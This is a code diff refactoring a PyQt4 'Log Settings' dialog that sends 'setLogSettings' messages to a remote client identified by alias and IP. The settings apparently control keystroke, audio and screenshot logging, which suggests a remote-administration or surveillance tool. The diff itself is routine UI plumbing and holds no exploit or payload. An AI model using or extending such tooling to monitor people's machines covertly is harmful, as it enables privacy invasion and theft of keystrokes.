@@ -1,12 +1,5 @@
 from ui.log_settings import Ui_Form as LogSettingsUi
 from PyQt4.QtGui import *
-from PyQt4.QtCore import *
-
-from libs.language import Translate
-
-# Multi Lang
-translate = Translate()
-_ = lambda _word: translate.word(_word)
 
 
 class LogSettings(QWidget, LogSettingsUi):
@@ -15,14 +8,10 @@ class LogSettings(QWidget, LogSettingsUi):
         QWidget.__init__(self)
         self.setupUi(self)
 
+        self.moderat = args['moderat']
         self.alias = args['alias']
         self.ip_address = args['ip_address']
-        title_prefix = self.alias if len(self.alias) > 0 else self.ip_address
-        self.setWindowTitle(u'[{}] {}'.format(title_prefix, _('LOG_SETTINGS_TITLE')))
-
-        self.moderator = args['moderator']
         self.client = args['client']
-        self.session_id = args['session_id']
         self.kts = args['kts']
         self.kt = args['kt']
         self.ats = args['ats']
@@ -30,10 +19,11 @@ class LogSettings(QWidget, LogSettingsUi):
         self.sts = args['sts']
         self.std = args['std']
         self.st = args['st']
-        if not args['audio'] == 'NoDevice':
-            self.no_audio = False
-        else:
-            self.no_audio = True
+        self.no_audio = not not args['audio_device']
+        self.p2p = args['p2p']
+
+        title_prefix = self.alias if len(self.alias) > 0 else self.ip_address
+        self.setWindowTitle(u'[{}] {}'.format(title_prefix, self.moderat.MString('LOG_SETTINGS_TITLE')))
 
         # Init UI
         self.init_values()
@@ -89,5 +79,10 @@ class LogSettings(QWidget, LogSettingsUi):
         }
 
     def set_values(self):
-        self.moderator.send_msg(self.get_values(), 'setLogSettings', session_id=self.session_id, _to=self.client)
+        self.moderat.send_message(self.get_values(),
+                                  'setLogSettings',
+                                  session_id=self.moderat.session_id,
+                                  _to=self.client,
+                                  module_id='',
+                                  p2p=self.p2p)
         self.close()
